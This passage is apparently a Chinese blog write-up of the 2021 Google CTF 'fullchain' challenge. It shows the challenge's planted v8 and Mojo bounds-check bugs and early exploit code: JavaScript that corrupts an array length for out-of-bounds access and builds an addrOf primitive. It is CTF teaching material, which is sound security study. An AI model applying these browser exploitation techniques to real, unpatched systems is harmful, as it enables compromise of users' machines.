<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="baidu-site-verification" content="NkA6ndXFZC">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"www.xi4oyu.top","root":"/","images":"/images","scheme":"Gemini","version":"8.7.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
<meta name="description" content="2021 google ctf 一道 pwn 题的复现，正如题目的名字，这是一条利用链，从 v8 到 sandbox-escape 再到 kernel pwn 提权">
<meta property="og:type" content="article">
<meta property="og:title" content="2021-google-ctf-pwn-fullchain">
<meta property="og:url" content="http://www.xi4oyu.top/68622871/index.html">
<meta property="og:site_name" content="feather&#39;s blog">
<meta property="og:description" content="2021 google ctf 一道 pwn 题的复现，正如题目的名字，这是一条利用链，从 v8 到 sandbox-escape 再到 kernel pwn 提权">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/0.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/4.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/5.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/7.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/8.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/9.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/10.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/11.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/13.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/12.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/68622871/14.png">
<meta property="article:published_time" content="2021-07-26T03:32:00.000Z">
<meta property="article:modified_time" content="2021-07-26T03:32:00.000Z">
<meta property="article:author" content="feather">
<meta property="article:tag" content="v8">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="sandbox-escape">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.xi4oyu.top/images/68622871/0.png">


<link rel="canonical" href="http://www.xi4oyu.top/68622871/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://www.xi4oyu.top/68622871/","path":"68622871/","title":"2021-google-ctf-pwn-fullchain"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>2021-google-ctf-pwn-fullchain | feather's blog</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="feather's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">feather's blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8E-chrome-%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.</span> <span class="nav-text">从 chrome 到任意代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#v8-exploit"><span class="nav-number">2.1.1.</span> <span class="nav-text">v8 exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%8E%E8%B6%8A%E7%95%8C%E5%86%99%E5%88%B0%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">从越界写到越界读写</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#addrOf"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">addrOf</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#AAR-AAW"><span class="nav-number">2.1.1.3.</span> <span class="nav-text">AAR&#x2F;AAW</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Enable-Mojo"><span class="nav-number">2.1.1.4.</span> <span class="nav-text">Enable Mojo</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sandbox-Escape"><span class="nav-number">2.1.2.</span> <span class="nav-text">Sandbox Escape</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#find-Ctf-Object"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">find Ctf Object</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ROP"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">ROP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84-kernel-pwn"><span class="nav-number">2.2.</span> <span class="nav-text">简单的 kernel pwn</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="feather" src="/images/avatar.jpeg">
  <p class="site-author-name" itemprop="name">feather</p>
  <div class="site-description" itemprop="description">计算机技术&个人琐碎事</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">63</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/featherl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;featherl" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:featherm@126.com" title="E-Mail → mailto:featherm@126.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://0x4qe.github.io/" title="https:&#x2F;&#x2F;0x4qe.github.io&#x2F;" rel="noopener" target="_blank">0x4qE</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://wzyxv1n.top/" title="https:&#x2F;&#x2F;wzyxv1n.top&#x2F;" rel="noopener" target="_blank">转爷</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://github.red/" title="https:&#x2F;&#x2F;github.red&#x2F;" rel="noopener" target="_blank">茄皇</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://fl0.top/" title="http:&#x2F;&#x2F;fl0.top&#x2F;" rel="noopener" target="_blank">qz</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://legr4ndk.github.io/" title="https:&#x2F;&#x2F;legr4ndk.github.io&#x2F;" rel="noopener" target="_blank">Legrandk</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://ugi57.github.io/" title="https:&#x2F;&#x2F;ugi57.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.thesoldierjack.cn/" title="https:&#x2F;&#x2F;www.thesoldierjack.cn&#x2F;" rel="noopener" target="_blank">digger</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://wr-web.github.io/" title="https:&#x2F;&#x2F;wr-web.github.io&#x2F;" rel="noopener" target="_blank">wr</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://annevi.cn/" title="https:&#x2F;&#x2F;annevi.cn&#x2F;" rel="noopener" target="_blank">annevi</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://www.zhouweitong.site/" title="http:&#x2F;&#x2F;www.zhouweitong.site&#x2F;" rel="noopener" target="_blank">obj</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://blog.wz22.cc/" title="https:&#x2F;&#x2F;blog.wz22.cc&#x2F;" rel="noopener" target="_blank">Moesang</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://me.liki.link/" title="https:&#x2F;&#x2F;me.liki.link&#x2F;" rel="noopener" target="_blank">kg</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://cosmos.red/" title="https:&#x2F;&#x2F;cosmos.red&#x2F;" rel="noopener" target="_blank">boss-c</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://jacksonyu1334.github.io/" title="https:&#x2F;&#x2F;jacksonyu1334.github.io" rel="noopener" target="_blank">jackson</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://cjovi.icu/" title="https:&#x2F;&#x2F;cjovi.icu&#x2F;" rel="noopener" target="_blank">cj</a>
        </li>
    </ul>
  </div>

          </div>
        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://www.xi4oyu.top/68622871/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="feather">
      <meta itemprop="description" content="计算机技术&个人琐碎事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="feather's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2021-google-ctf-pwn-fullchain
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-07-26 11:32:00" itemprop="dateCreated datePublished" datetime="2021-07-26T11:32:00+08:00">2021-07-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>27k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>25 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>2021 google ctf 一道 pwn 题的复现，正如题目的名字，这是一条利用链，从 v8 到 sandbox-escape 再到 kernel pwn 提权</p>
<span id="more"></span>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官方附件：</p>
<p><code>https://storage.googleapis.com/gctf-2021-attachments-project/c12856fc6c010d643763e678265f7921b7a44dcd7bcb5ced32634d21dfdff0c5f9542d6a5bdcc6639d8834ab1ff25b263affd8952b11e972c2066aa3cae71540</code></p>
<p>官方题目源码：<code>https://github.com/google/google-ctf/tree/master/2021/quals/pwn-fullchain</code><br>(<em>环境很大，要搭建很久</em>)</p>
<p>远程环境：<code>fullchain.2021.ctfcompetition.com 1337</code></p>
<p>chromium 的 commit 为：<code>1be58e78c7ec6603d416aed4dfae757334cd4e1e</code></p>
<p>为了方便地调试 v8 的漏洞，需要搭建一下 v8 的环境，可以在下面的链接找到对应的 v8 commit ：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromium.googlesource.com/chromium/src/+/1be58e78c7ec6603d416aed4dfae757334cd4e1e/DEPS">https://chromium.googlesource.com/chromium/src/+/1be58e78c7ec6603d416aed4dfae757334cd4e1e/DEPS</a></p>
<p>找到到 <code>v8_revision</code> 字段，得到 commit</p>
<pre class="line-numbers language-none"><code class="language-none">...
  &#39;v8_revision&#39;: &#39;0cf641358acebb26c2b7ddc047b1b41597d344c8&#39;,
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>搭建 v8 的调试环境即可</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>题目要求输入一个 html 文件，交给 chrome 解析，flag 在 <code>/dev/vdb</code> 里，并且要 root 权限</p>
<p>那么要从 chrome 任意代码执行，然后 kernel pwn 提权了</p>
<h3 id="从-chrome-到任意代码执行"><a href="#从-chrome-到任意代码执行" class="headerlink" title="从 chrome 到任意代码执行"></a>从 chrome 到任意代码执行</h3><p>先来看看 chrome，题目用两个 patch 构造了两个 bug，分别对应 v8 和 Mojo</p>
<p>v8_bug.patch：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">diff --git a&#x2F;src&#x2F;builtins&#x2F;typed-array-set.tq b&#x2F;src&#x2F;builtins&#x2F;typed-array-set.tq
index b5c9dcb261..ac5ebe9913 100644
--- a&#x2F;src&#x2F;builtins&#x2F;typed-array-set.tq
+++ b&#x2F;src&#x2F;builtins&#x2F;typed-array-set.tq
@@ -198,7 +198,7 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
   if (targetOffsetOverflowed) goto IfOffsetOutOfBounds;
 
   &#x2F;&#x2F; 9. Let targetLength be target.[[ArrayLength]].
-  const targetLength &#x3D; target.length;
+  &#x2F;&#x2F; const targetLength &#x3D; target.length;
 
   &#x2F;&#x2F; 19. Let srcLength be typedArray.[[ArrayLength]].
   const srcLength: uintptr &#x3D; typedArray.length;
@@ -207,8 +207,8 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
 
   &#x2F;&#x2F; 21. If srcLength + targetOffset &gt; targetLength, throw a RangeError
   &#x2F;&#x2F;   exception.
-  CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
-      otherwise IfOffsetOutOfBounds;
+  &#x2F;&#x2F; CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
+  &#x2F;&#x2F;     otherwise IfOffsetOutOfBounds;
 
   &#x2F;&#x2F; 12. Let targetName be the String value of target.[[TypedArrayName]].
   &#x2F;&#x2F; 13. Let targetType be the Element Type value in Table 62 for
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个 patch 很简单，把 TypedArray 的 set 方法的边界检查给去掉了</p>
<p>set 方法是从指定索引开始给数组填充数据，没有了边界检查，那么就可以越界写了</p>
<p>从越界写构造任意读写，那么就可以做很多事情了，当然了执行 shellcode 拿 shell 是不行的，因为 chrome 开启了 sandbox，v8 引擎的进程运行在 sandbox 中，很多系统调用如 execve 都无法使用，想要拿到 shell，就要利用接下来的 Mojo 的漏洞进行 sandbox-escape 了</p>
<p>来看看 Mojo 的 bug，在文件 sbx_bug.patch 中，patch 给 Mojo 添加了一个 interface，有 ResizeVector，Read，Write 方法如下：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void CtfInterfaceImpl::ResizeVector(uint32_t size,
                                    ResizeVectorCallback callback) &#123;
  numbers_.resize(size);
  std::move(callback).Run();
&#125;

void CtfInterfaceImpl::Read(uint32_t offset, ReadCallback callback) &#123;
  std::move(callback).Run(numbers_[offset]);
&#125;

void CtfInterfaceImpl::Write(double value,
                             uint32_t offset,
                             WriteCallback callback) &#123;
  numbers_[offset] &#x3D; value;
  std::move(callback).Run();
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中 numbers_ 成员是 std::vector 类，可以看到 Read 和 Write 方法都没有对索引进行越界检查，而且 std::vector 类对运算符 <code>[]</code> 的重载中，也是没有边界检查的，所以 Read 和 Write 可以任意越界读写，且 Mojo 的进程是不在 sandbox 里的，利用任意越界读写可以在 Mojo 的进程里执行 shellcode 就能拿到 shell</p>
<h4 id="v8-exploit"><a href="#v8-exploit" class="headerlink" title="v8 exploit"></a>v8 exploit</h4><p>默认情况下，chrome 是不开启 Mojo 的功能的，需要添加相应的启动参数，但是 chrome 是有一些全局的 flags 控制运行时开启某些功能，开启 Mojo 的 flag 是 <code>is_mojo_js_enabled</code> 和 <code>is_mojo_js_test_enabled</code>，这两个是布尔类型的变量，通过 v8 的漏洞，将这两个变量改写为 true，重新加载页面即可开启 Mojo</p>
<h5 id="从越界写到越界读写"><a href="#从越界写到越界读写" class="headerlink" title="从越界写到越界读写"></a>从越界写到越界读写</h5><p>调试以下代码：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>oob_arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到数组 b 的 data_ptr 即数组的起始地址：<br><img src="/images/68622871/0.png" alt="data_ptr"></p>
<p>以及数组 oob_arr 的信息：<br><img src="/images/68622871/1.png" alt="oob_arr"></p>
<p>oob_arr 的长度为 4，因为 smi 用最低 bit 为 0 标记，那么 length 在内存中的值为 8，可以看到在如下地址处：<br><img src="/images/68622871/2.png" alt="length"></p>
<p>那么越界改写 oob_arr 的 length 字段，即可利用 oob_arr 造成任意越界读写，计算偏移如下：<br><img src="/images/68622871/3.png" alt="offset_overwrite_length"></p>
<p>那么只要 <code>b.set([fake_length], 32)</code>，即可达到改写 oob_arr 的 length 字段了，后续代码如下：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">a<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">444444</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
b<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以看到 length 字段成功被改写：<br><img src="/images/68622871/4.png" alt="oob"></p>
<h5 id="addrOf"><a href="#addrOf" class="headerlink" title="addrOf"></a>addrOf</h5><p>泄露地址的方式很简单，构造 Float 和 Object 的类型混淆就行，通过 Object 数组放入对象，再利用 oob_arr 越界把对象当作浮点数（也就是对象的地址）读出来即可：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> obj_faker <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>oob_arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>obj_faker<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调试看到 obj_faker 和 oob_arr 的信息：<br><img src="/images/68622871/5.png" alt="obj_faker"></p>
<p><img src="/images/68622871/7.png" alt="oob_arr"></p>
<p>计算偏移：<br><img src="/images/68622871/8.png" alt="offset_addrOf"></p>
<p><strong>注意：</strong> 因为 FixedDoubleArray 每个元素的大小是 8 字节，所以计算索引的时候是除以 8，而 FixedArray 每个元素都是对象的指针或者 smi （小整数），而且是 pointer compress （即指针压缩）的，占用 4 字节，所以 leak 出来的低 4 字节才是对象地址（压缩后的）</p>
<p>根据偏移可以编写 addrOf 函数了：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    obj_faker<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span>
    <span class="token keyword">return</span> oob_arr<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffn</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了方便浮点数和整数的转换还添加了下面的代码：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> conversion_buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> float_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> int_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
